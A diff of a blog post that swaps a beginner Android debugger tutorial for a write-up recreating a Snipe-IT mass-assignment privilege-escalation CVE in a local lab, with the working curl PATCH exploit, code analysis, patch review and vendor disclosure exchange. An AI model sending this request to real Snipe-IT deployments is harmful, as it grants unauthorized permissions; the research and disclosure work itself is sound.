@@ -1,190 +1,254 @@
 ---
-
-title: "Your First Android App: Beating Hextree Challenge 1 with the Debugger"
-date: 2026-07-27
+title: "CVE-2026-48493 (SNIPE-IT): I Thought This Was Going To Be Easy"
+date: 2026-08-01
 draft: false
-description: "A beginner-friendly walkthrough of Hextree's Android Challenge 1."
-tags: ["android", "mobile-security", "reverse-engineering", "beginner", "mobile-pentesting", "hextree"]
-categories: ["android", "mobile-security", "reverse-engineering", "beginner", "mobile-pentesting", "hextree"]
+description: "A privilege escalation bug in Snipe-IT's API — and the story of a Tuesday afternoon that turned into a very long night."
+tags: ["cve-recreation", "vulnerability-research", "snipe-it", "privilege-escalation", "mass-assignment", "broken-access-control", "api-security", "owasp-api3", "bopla", "php", "laravel", "docker", "beginner"]
+categories: ["vulnerability-research", "web-security", "api-security", "cve-recreation"]
 showAuthor: true
 showDate: true
 showReadingTime: true
 showWordCount: true
-featureimage: "https://assetstorev1-prd-cdn.unity3d.com/key-image/6206a07c-867b-42ac-9e8e-ba0d82c6a115.webp"
+featureimage: "https://imgs.search.brave.com/VoOh77OXWDTz0t_CgKaaiwHrl38YRRsja1uHqs8Pe1s/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbm92/YXRlY2h5LmNvbS93/cC1jb250ZW50L3Vw/bG9hZHMvMjAyMy8x/MC9TbmlwZUlUQmxv/Zy5qcGc"
 ---
 
-If you're just getting started with Android app security, [Hextree's android-challenge1](https://github.com/hextreeio/android-challenge1) is a great first stop. It doesn't need Frida, Jadx, or any heavyweight reversing tools - everything you need is already sitting inside Android Studio. All we're going to do here is **read the source code carefully** and use the built-in **debugger** to skip past a couple of annoying checks.
+## Tuesday, 16:25
 
-Let's get into it.
+The message came in mid-afternoon. Winter — our team cap — was calling people into a research group. The pitch was simple: read CVEs, try to find the bug like you never knew about it, share notes, grind the methodology together. No pace requirements. No pressure. Just research.
 
-## Setting up
+The requirements to join? Basics. Just show up and commit.
 
-Clone the repo and open it in Android Studio:
+*This is going to be easy,* I thought.
+
+I was wrong. It was not easy. It was not even close to easy. But I'm getting ahead of myself.
+
+---
+
+## The Setup — or: Docker and I Have Unresolved Issues
+
+The target was **CVE-2026-48493** — a privilege escalation bug in **Snipe-IT**, an open-source IT asset management system. Medium severity. CVSS 5.5. Friendly difficulty, Winter said. The point was the methodology, not the suffering.
+
+The suffering came anyway.
+
+First things first — I needed to spin up a vulnerable lab. Docker was the obvious path. Pin the image to **v8.5.0** (the version named in the advisory, patched in 8.6.0), get the app running, then start hunting. Simple.
+
+Except the first thing Docker gave me was this:
+
+```
+permission denied while trying to connect to the Docker daemon socket
+at unix:///var/run/docker.sock
+```
+
+Classic. My user wasn't in the `docker` group, so I couldn't talk to the daemon at all. That was five minutes of confusion before I figured out I just needed `sudo`. Fine.
+
+Then the next trap: the `docker-compose.yml` in the repo had this line:
+
+```yaml
+image: snipe/snipe-it:${APP_VERSION:-latest}
+```
+
+The `APP_VERSION` field in `.env` was blank. Which means it defaults to `latest`. Which by now is **v8.6.0** — the patched version. If I hadn't caught that, I would've been poking at a fixed codebase the entire time with absolutely no idea why the bug wasn't showing up. That kind of silent failure is the most frustrating kind — nothing errors out, it just doesn't work, and you sit there questioning yourself.
+
+The fix was one line in `.env`:
+
+```
+APP_VERSION=v8.5.0
+```
+
+Small thing. Big consequence. Write your version pins down. Always.
+
+After that, setup was mostly smooth. The Snipe-IT pre-flight wizard confirmed the right version at the bottom of the page:
+
+**Snipe-IT Version v8.5.0 - build 22652 (master)**
+
+That version string was a moment of genuine relief.
+
+---
+
+## The Bug — What We Were Actually Looking For
+
+Before firing anything, I want to explain what the advisory actually says, because understanding *what* you're trying to reproduce before you start is step one of the methodology.
+
+**CVE-2026-48493** is a **Broken Object Property Level Authorization** bug — OWASP API Security Top 10, API3. The class is also called **mass assignment**. In plain English:
+
+An API endpoint accepts user input and writes it to a database record without checking whether the person sending the request is actually *allowed* to control those fields.
+
+In Snipe-IT's case specifically: a user with only `users.edit` and API token permissions could send a `PATCH` request to `/api/v1/users/{their_own_id}` and write arbitrary permissions to their own account — `assets.view`, `assets.create`, `reports`, `import`, whatever they wanted. The only things blocked were `admin` and `superuser`.
+
+**Flaw classification:** CWE-863 (Incorrect Authorization) — the app fails to distinguish between "editing another user's profile" and "editing your own permissions." Those should not be the same operation with the same access level.
+
+**Disclosed:** June 23, 2026. **Patched in:** Snipe-IT 8.6.0.
+
+---
+
+## Setting Up the Attack Scenario
+
+For a privilege escalation bug, you need to start from a position of genuine weakness. The whole point is: *this user should not be able to do this.* So I created a group — `low-priv-test-group` — with exactly two permissions and nothing else:
+
+- `Edit Users` (maps to `users.edit`)
+- `Manage API Tokens` (maps to `self.api`)
+
+No asset permissions. No reports. No admin. No superuser. A test user `lowpriv_user1` got assigned to this group and nothing else.
+
+Then I grabbed an API token for that user, set it as an environment variable, and confirmed my identity and current permissions via the API:
 
 ```bash
-git clone https://github.com/hextreeio/android-challenge1
+curl -s -H "Authorization: Bearer $TOKEN" \
+     -H "Accept: application/json" \
+     http://localhost:8000/api/v1/users/me | python3 -m json.tool
 ```
 
-Once the project loads, the first place to look isn't the Java code - it's `AndroidManifest.xml`. This file tells you which screens (Activities) exist in the app, and which ones are allowed to be launched from outside the app.
+The response came back with every single permission set to `0`. Every one. That was my baseline — the "before" snapshot that makes the "after" mean something. Documentation isn't just for showing that the exploit worked. It's for proving the starting conditions were genuinely restricted.
 
-```xml
-<activity
-    android:name=".FlagActivity"
-    android:exported="false" />
-<activity
-    android:name=".ChallengeActivity"
-    android:exported="false" />
-<activity
-    android:name=".MainActivity"
-    android:exported="true">
-    <intent-filter>
-        <action android:name="android.intent.action.MAIN" />
-        <category android:name="android.intent.category.LAUNCHER" />
-    </intent-filter>
-</activity>
+---
+
+## Firing the Exploit
+
+One PATCH request. That's all it took.
+
+```bash
+curl -s -X PATCH \
+     -H "Authorization: Bearer $TOKEN" \
+     -H "Accept: application/json" \
+     -H "Content-Type: application/json" \
+     -d '{"permissions":{"assets.view":"1","assets.create":"1","reports":"1","import":"1"}}' \
+     http://localhost:8000/api/v1/users/2 | python3 -m json.tool
 ```
 
-So the app has three screens:
+The server responded:
 
-* **MainActivity** - the launcher screen, `exported="true"`, so this is the only one we can open directly.
-* **ChallengeActivity** - internal, `exported="false"`.
-* **FlagActivity** - internal, `exported="false"`.
-
-Since the two interesting activities can't be triggered from outside the app, we'll have to earn our way into them from inside `MainActivity` itself.
-
-## Stage 1: Getting past the counter
-
-Opening `MainActivity.java`, this is the part that matters:
-
-```java
-TextView text = findViewById(R.id.main_text);
-text.setOnClickListener(new View.OnClickListener() {
-    @Override
-    public void onClick(View v) {
-        counter++;
-        text.setText("Counter: "+counter);
-        if(counter>9999) {
-            startActivity(new Intent(MainActivity.this, ChallengeActivity.class));
-        }
-    }
-});
-```
-
-Every tap on the text view increments `counter`, and once it passes 9999, the app launches `ChallengeActivity`. Technically you *could* just tap the screen ten thousand times, but that's a great way to lose interest in Android security on day one. Instead, let's cheat - with the debugger.
-
-The idea is simple: pause the app right at the line where `counter` gets incremented, manually change the value of that variable to something bigger than 9999, then let the app continue running as if nothing happened.
-
-**Step 1 - Attach the debugger.** Click the debug icon (the little bug) in the top toolbar and wait for the app to install and launch on the emulator.
-
-![debugging_app](/images/YourFirstAndroidApp/DebuggingApp.png)
-
-**Step 2 - Set a breakpoint.** Click in the gutter next to the `counter++;` line so a red dot appears there. This tells the debugger to pause execution exactly when that line is about to run.
-
-**Step 3 - Trigger it.** Tap the text view on the emulator once. The app will freeze at your breakpoint, and the **Threads \& Variables** tab at the bottom of Android Studio will show you the current value of `counter`.
-
-**Step 4 - Override the value.** Right-click on `counter` in that panel and choose to set its value. Type in anything above 9999, 10000 works just fine.
-
-![overriding_counter](/images/YourFirstAndroidApp/OverridingCounter.png)
-
-**Step 5 - Resume.** Mute the breakpoint (so it doesn't keep stopping you) and hit Resume. The `if(counter>9999)` check now passes instantly, and the app jumps straight into `ChallengeActivity`.
-
-![challenge_activity](/images/YourFirstAndroidApp/ChallengeActivity.png)
-
-## Stage 2: Picking the right button
-
-`ChallengeActivity` throws ten buttons at you, and the code makes it look like a trap:
-
-```java
-View.OnClickListener failHandler = new View.OnClickListener() {
-    @Override
-    public void onClick(View v) {
-        startActivity(new Intent(ChallengeActivity.this, MainActivity.class));
-    }
-};
-
-findViewById(R.id.button1).setOnClickListener(failHandler);
-findViewById(R.id.button2).setOnClickListener(failHandler);
-findViewById(R.id.button3).setOnClickListener(failHandler);
-findViewById(R.id.button4).setOnClickListener(failHandler);
-findViewById(R.id.button5).setOnClickListener(failHandler);
-findViewById(R.id.button6).setOnClickListener(failHandler);
-findViewById(R.id.button7).setOnClickListener(failHandler);
-findViewById(R.id.button8).setOnClickListener(failHandler);
-findViewById(R.id.button9).setOnClickListener(new View.OnClickListener() {
-    @Override
-    public void onClick(View v) {
-        startActivity(new Intent(ChallengeActivity.this, FlagActivity.class));
-    }
-});
-findViewById(R.id.button10).setOnClickListener(failHandler);
-```
-
-Nine of the ten buttons just bounce you straight back to `MainActivity` (`failHandler`). Only **Button 9** has its own listener, and it's the only one that opens `FlagActivity` - the screen we actually want. No guessing required once you've read the code; just tap Button 9.
-
-![flag_activity](/images/YourFirstAndroidApp/FlagctivityAfterButton9.png)
-
-## Stage 3: Cracking the seek bar
-
-`FlagActivity` hides the flag behind a `SeekBar` (a slider):
-
-```java
-int progressTracking = 0;
-
-@Override
-protected void onCreate(Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    setContentView(R.layout.activity\_flag);
-
-    TextView text = findViewById(R.id.flag\_text);
-    SeekBar bar = findViewById(R.id.seek\_bar);
-    bar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
-        @Override
-        public void onProgressChanged(SeekBar seekBar, int progress, boolean fromUser) {
-            text.setText("Read the code: "+progress+"%");
-            progressTracking = progress;
-        }
-
-        @Override
-        public void onStartTrackingTouch(SeekBar seekBar) {
-        }
-
-        @Override
-        public void onStopTrackingTouch(SeekBar seekBar) {
-            if(progressTracking==42) {
-                text.setText(decryptFlag());
-            }
-        }
-    });
+```json
+"status": "success",
+"messages": "User was successfully updated.",
+"permissions": {
+    "assets.view": 1,
+    "assets.create": 1,
+    "reports": 1,
+    "import": 1,
+    "superuser": 0,
+    "admin": 0
 }
 ```
 
-The flag only shows up if the slider's progress is **exactly 42%** at the moment you let go of it.
+No error. No rejection. No authorization check fired. `superuser` and `admin` stayed at `0` — exactly as the advisory described, those two are blocked. Everything else went straight through.
 
-{{< alert "circle-info" >}}
-Notice *where* that check lives: inside `onStopTrackingTouch`, not `onProgressChanged`. That means the comparison isn't happening while you're dragging the slider - it only fires the instant you release your finger (or mouse click) off the seek bar. Drag to 42%, and you can still overshoot it on release.
-{{< /alert >}}
+A follow-up `/me` call confirmed it persisted. This wasn't a response artifact — the database accepted and stored the changes. The CVE was reproduced.
 
-There are two ways to solve this: drag the slider around very carefully until you land on exactly 42%, or just use the debugger again. Let's go with the debugger - it's more reliable and, frankly, more satisfying.
+---
 
-**Step 1 - Breakpoint on the check.** Set a breakpoint on the `if(progressTracking==42)` line.
+## Why Did This Work? Reading the Code
 
-**Step 2 - Trigger it.** Drag the slider a bit and release it. Execution pauses right at your breakpoint.
+Reproducing the bug is one thing. Understanding *why* it works is the part that actually builds skill. Snipe-IT is a **Laravel** application, so I went into the source:
 
-**Step 3 - Override the variable.** In the Threads \& Variables panel, right-click `progressTracking` and set it to `42`, regardless of where the slider visually sits.
+```bash
+grep -n -A 100 "function update" app/Http/Controllers/Api/UsersController.php
+```
 
-![overriding__slider_variable](/images/YourFirstAndroidApp/SetSliderTo42.png)
+The `update()` method in `UsersController.php` passes the `permissions` field through an action called `PreserveUnauthorizedPrivilegedPermissionsAction`. The name sounds reassuring — it implies it's stripping out things you shouldn't be able to set. And it does strip things. Just not many things.
 
-**Step 4 - Resume.** Mute the breakpoint, hit Resume, and the condition evaluates to true. `decryptFlag()` runs, and the flag is revealed on screen.
+```bash
+cat ./app/Actions/Permissions/PreserveUnauthorizedPrivilegedPermissionsAction.php
+```
 
-![flag](/images/YourFirstAndroidApp/Flag.png)
+Here's the entire protection logic:
 
-## Wrapping up
+```php
+if (! $authenticatedUser->isSuperUser()) {
+    // protect 'superuser'
+}
+if ((! $authenticatedUser->isAdmin()) && (! $authenticatedUser->isSuperUser())) {
+    // protect 'admin'
+}
+return $requestedPermissions;
+```
 
-That's the whole challenge:
+That's it. Two keys protected. Everything else — `assets.view`, `assets.create`, `reports`, `import`, and dozens more — passes through this function completely unchecked and gets written directly to the database.
 
-1. **MainActivity** - override `counter` past 9999 in the debugger instead of tapping 10,000 times.
-2. **ChallengeActivity** - read the code to find that only Button 9 leads anywhere useful.
-3. **FlagActivity** - override `progressTracking` to exactly 42 to satisfy the `onStopTrackingTouch` check.
+The function was named as if it had broad protection. It had two guards.
 
-Nothing here needed decompiling an APK or writing a single line of exploit code - just reading the Java source closely and letting Android Studio's debugger do the boring work of "typing in the right number." That's honestly most of Android app security at the beginner level: the vulnerable logic is usually sitting in plain sight, and the debugger is one of the most underrated tools for proving it.
+**The root cause:** the codebase treats `users.edit` as "can edit everything about a user including their permission set" when it should mean "can edit profile fields — only admins should touch permission sets."
 
+---
+
+## The Patch — and What It Missed
+
+The fix in **v8.6.0** added one block to that same action:
+
+```php
+// Disallow non-admin/superuser users from modifying their own permissions,
+// but allow them to modify other users' permissions (except for admin/superuser keys).
+if ($targetUser && ! $authenticatedUser->isSuperUser() && $authenticatedUser->id === $targetUser->id) {
+    return $originalPermissions;
+}
+```
+
+Read that comment carefully. *"Allow them to modify other users' permissions."*
+
+The fix blocks **self-escalation** — a user patching their own account. It doesn't touch the cross-user case at all.
+
+---
+
+## Meanwhile — Winter Was Not Done
+
+While I was working through the CVE recreation, Winter had kept going. He found two more issues in the same codebase and sent formal advisories to the Snipe-IT security team.
+
+**Advisory 1 — Cross-user privilege escalation via `users.edit` on `PATCH /api/v1/users/{id}`**
+
+The incomplete patch scenario: a user with `users.edit` can still PATCH *another* user's permissions and grant them anything except the crown permissions. Two low-privilege accounts cooperating can escalate each other indefinitely — User A escalates User B, User B escalates User A. Neither request triggers the self-edit block because `A.id !== B.id` in both directions.
+
+**Advisory 2 — Permission-ceiling gap in user creation via `users.create` on `POST /api/v1/users`**
+
+A separate but related issue in the user *creation* flow — a different endpoint, a distinct vector, filed separately to keep the scope clean. The same underlying theme: permissions that should require elevated access to assign were reachable through a lower-privileged operation.
+
+Both reports were sent with detailed transcripts, reproduction steps, and code path analysis.
+
+---
+
+## The Response
+
+Snipe-IT's security team replied. They were thorough — they reproduced all three vectors against v8.6.3 and the current development branch, confirmed the technical analysis was accurate, and then explained how they triaged it.
+
+Their position, in summary:
+
+`users.edit` is **intentionally** a delegated user-management role. In their model, the only hard ceilings applied to a `users.edit` holder are the crown permissions (`superuser`, `admin`, group assignments) — stripped unconditionally by `PreserveUnauthorizedPrivilegedPermissionsAction` regardless of target — and credential modification or activation-flag changes on admin/superuser accounts, which are blocked separately by the `canEditAuthFields` gate.
+
+Everything else — including granting non-crown permissions to any target — is delegated on purpose. The role is designed for HR staff, user managers, and helpdesk delegates who need to run onboarding, offboarding, name changes, org-chart updates, and location moves as routine work on any account.
+
+Against that model, they mapped our vectors:
+
+**Vector 1 (cross-user non-crown permission injection):** Delegated by design.
+
+Their reasoning is internally consistent — if you give someone `users.edit`, you are explicitly trusting them to manage users. The disagreement is really a question of whether that trust model is well-communicated to Snipe-IT administrators who might assign `users.edit` thinking it's a limited "edit profile fields" permission rather than a broad delegation.
+
+That's a legitimate design philosophy debate, not a clear-cut vulnerability in the traditional sense. A well-argued response, even if you disagree with the conclusion.
+
+---
+
+## What I Actually Learned
+
+This exercise wasn't really about the CVE. The CVE was the vehicle.
+
+What I actually learned:
+
+**Version pins are not optional.** One blank field in an `.env` file would have silently broken the entire lab. No error, just wrong behavior. Always confirm the exact version you're testing against, and record the commit hash — not just the tag.
+
+**The "before" screenshot matters as much as the "after."** Anyone can show a successful exploit. Showing the baseline — provably zero permissions before the request — is what makes the proof credible.
+
+**Reading code is a skill, not a talent.** I'm not a developer. I struggled with the PHP. But `grep` gets you to the right file, and reading one function at a time is manageable. You don't need to understand the whole codebase — you need to understand the one path the request travels.
+
+**Patches are not automatically complete.** Reading a diff critically — asking "what does this fix, and what does it not fix?" — is where follow-on research starts. That question led to two more advisories.
+
+**Vendor responses are part of the research.** Getting a response that says "this is by design" isn't a failure — it's information. Understanding *why* a vendor draws the line where they do teaches you about how real-world security tradeoffs get made. Sometimes you'll agree. Sometimes you won't. Either way you learn something.
+
+---
+
+This was the first target. It was not a breeze. It was a storm with Docker permission errors and silent version mismatches and late nights reading PHP I'd never seen before.
+
+But I walked out of it knowing exactly what mass assignment looks like in a real codebase, how to read a patch diff, and what responsible disclosure actually feels like in practice.
+
+Winter ([@byronchris25](https://x.com/byronchris25)) found the follow-on bugs. Oste ([@oste_ke](https://x.com/oste_ke)) was there for the painful parts. I took notes and got lost in Docker for longer than I'd like to admit.
+
+The suffering comes later, Winter said. He wasn't wrong. But it was worth it.
+
+---
+*Part of an ongoing vulnerability research methodology series. Next target TBD.*
